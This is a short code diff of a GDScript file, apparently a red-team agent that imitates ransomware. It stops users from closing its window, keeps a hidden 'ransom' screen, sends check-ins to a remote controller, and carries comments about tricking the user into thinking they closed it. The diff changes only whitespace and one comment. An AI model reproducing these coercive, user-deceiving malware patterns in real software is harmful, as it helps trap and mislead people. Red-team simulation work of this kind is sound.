@@ -23,12 +23,13 @@ func _notification(what):
 		# Send notification to redteam that the user is trying to close the agent?
 		# Send window to background so they think they were successful, set timer, pop-up again in a little bit?
 
+
 func _ready():
 	get_tree().set_auto_accept_quit(false) # Don't let users click X or alt+F4
 	get_tree().get_root().set_transparent_background(true) # transparent background?
 
 	$ransom.hide()
-	
+
 	_client.connect("connection_closed", self, "_closed")
 	_client.connect("connection_error", self, "_error")
 	_client.connect("connection_established", self, "_connected")
@@ -68,7 +69,7 @@ func _connected(_proto = ""):
 	if ret != OK:
 		print("failed to send checkin")
 	else:
-		print("checkin sent")
+		print("checkin sent") # After N tasking requests w/o responses - kill ourself 
 
 func _on_data():
 	var packet = _client.get_peer(1).get_packet().get_string_from_utf8()
